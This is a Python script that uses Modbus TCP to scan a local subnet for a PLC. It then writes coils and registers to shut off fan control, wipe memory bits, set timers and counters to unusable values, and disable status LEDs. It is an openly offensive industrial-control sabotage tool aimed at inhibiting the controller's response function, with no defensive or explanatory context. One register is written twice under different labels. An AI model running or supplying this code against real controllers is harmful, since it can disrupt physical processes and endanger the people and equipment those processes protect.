from pymodbus.client.sync import ModbusTcpClient
import socket
import ipaddress

# Function to scan for the PLC IP address on the subnet
def discover_plc_ip(subnet="192.168.9.0/24", port=502):
    print("Scanning for PLC on subnet:", subnet)
    for ip in ipaddress.IPv4Network(subnet, strict=False):
        try:
            # Attempt to connect to the Modbus TCP port
            client = ModbusTcpClient(str(ip), port=port)
            if client.connect():
                print(f"PLC found at IP: {ip}")
                client.close()
                return str(ip)
            client.close()
        except Exception as e:
            pass  # Ignore errors for hosts that don't respond
    print("No PLC found on the subnet.")
    return None

# Function to interact with the PLC using Modbus and disable its response
def inhibit_response_function(ip_address):
    print(f"Connecting to PLC at {ip_address} to inhibit response function...")

    # Initialize Modbus connection
    client = ModbusTcpClient(ip_address)
    if not client.connect():
        print("Failed to connect to the PLC.")
        return

    try:
        # Step 1: Identify and manipulate critical tags
        # Inhibit Q_FAN (%Q0.0) - stop fan control
        print("Disabling Q_FAN (Fan Control)...")
        client.write_coil(0, False)  # %Q0.0 => Address 0 in Modbus coils

        # Step 2: Trigger a memory destruction event or overwrite critical memory
        print("Destroying memory bit M_ACTFAN (%M1)...")
        client.write_coil(1, False)  # %M1 => Address 1 in Modbus coils

        print("Destroying memory bit M_TOG (%M2)...")
        client.write_coil(2, False)  # %M2 => Address 2 in Modbus coils

        # Step 3: Corrupt timers or counters - set them to unresponsive state
        print("Simulating data destruction by corrupting the counter and timers...")
        client.write_register(0, 0)  # %C0 Counter => Address 0 in Modbus holding registers
        client.write_register(0, 9999)  # %TM0 TimerPreset => Force unusable high value
        client.write_register(1, 9999)  # %TM1 TimerPreset => Force unusable high value

        # Step 4: Corrupt corresponding output LEDs (%Q0.4 and %Q0.5)
        print("Disabling LEDs (Red and Green)...")
        client.write_coil(4, False)  # %Q0.4 Red LED => Address 4 in Modbus coils
        client.write_coil(5, False)  # %Q0.5 Green LED => Address 5 in Modbus coils

        print("Response function inhibited successfully.")
    except Exception as e:
        print(f"An error occurred: {e}")
    finally:
        client.close()

# Main Execution
if __name__ == "__main__":
    # Step 1: Attempt to discover the PLC IP address
    plc_ip = discover_plc_ip()  # Default subnet is 192.168.9.0/24

    if plc_ip:
        # Step 2: Inhibit response function after finding the IP
        inhibit_response_function(plc_ip)
    else:
        print("PLC could not be found. Exiting.")